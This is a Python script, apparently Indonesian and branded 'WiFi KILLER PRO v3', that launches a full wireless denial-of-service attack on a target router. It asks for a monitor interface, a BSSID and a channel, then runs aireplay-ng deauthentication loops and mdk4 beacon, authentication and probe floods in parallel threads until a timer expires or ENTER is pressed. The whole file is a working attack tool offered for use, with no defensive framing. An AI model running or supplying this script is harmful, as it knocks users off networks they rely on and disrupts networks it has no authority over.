#!/usr/bin/env python3
import os
import time
import random
import threading
import subprocess

G = '\033[92m'
R = '\033[91m'
Y = '\033[93m'
C = '\033[96m'
W = '\033[0m'

os.system('clear')

banner = f"""
{C}╔═══════════════════════════════════════════╗
║   🔥 WiFi KILLER PRO v3 - BARZZ_BOT 🔥    ║
║        Created by : @Barxzzz               ║
║        Mode       : Full Destroy           ║
╚═══════════════════════════════════════════╝{W}
"""
print(banner)

# === Input ===
interface = input(f"{G}[?] Interface monitor (contoh: wlan0mon): {W}") or "wlan0mon"
bssid = input(f"{G}[?] BSSID router (contoh: 00:11:22:33:44:55): {W}")
channel = input(f"{G}[?] Channel (1-11): {W}") or "6"
duration = int(input(f"{G}[?] Durasi (detik, 0 = forever): {W}") or 0)

# === Set channel ===
os.system(f"sudo iwconfig {interface} channel {channel}")

# === Fungsi serangan ===
def deauth_all():
    while True:
        os.system(f"sudo aireplay-ng -0 0 -a {bssid} {interface}")
        time.sleep(0.5)

def deauth_client():
    while True:
        os.system(f"sudo aireplay-ng -0 0 -a {bssid} -c ff:ff:ff:ff:ff:ff {interface}")
        time.sleep(0.5)

def beacon_flood():
    while True:
        os.system(f"sudo mdk4 {interface} b -c {channel} -s 1000")
        time.sleep(1)

def auth_dos():
    while True:
        os.system(f"sudo mdk4 {interface} a -a {bssid} -s 1000")
        time.sleep(1)

def probe_flood():
    while True:
        os.system(f"sudo mdk4 {interface} p -c {channel} -s 1000")
        time.sleep(1)

# === Jalankan semua serangan paralel ===
threads = [
    threading.Thread(target=deauth_all),
    threading.Thread(target=deauth_client),
    threading.Thread(target=beacon_flood),
    threading.Thread(target=auth_dos),
    threading.Thread(target=probe_flood)
]

print(f"\n{G}[+] Target BSSID: {bssid}{W}")
print(f"{G}[+] Channel: {channel}{W}")
print(f"{G}[+] Interface: {interface}{W}")
print(f"{G}[+] Memulai semua serangan...{W}\n")

for t in threads:
    t.daemon = True
    t.start()

# === Durasi ===
if duration > 0:
    time.sleep(duration)
    print(f"\n{R}[!] Durasi habis, menghentikan serangan{W}")
    os.system("pkill -f aireplay-ng")
    os.system("pkill -f mdk4")
else:
    input(f"\n{Y}[!] Tekan ENTER untuk stop{W}")
    os.system("pkill -f aireplay-ng")
    os.system("pkill -f mdk4")

print(f"\n{G}═══════════════════════════════════════════{W}")
print(f"{G}[✓] SERANGAN DIHENTIKAN{W}")
print(f"{R}[✓] Router target kemungkinan sudah mati / restart{W}")
print(f"{G}═══════════════════════════════════════════{W}")
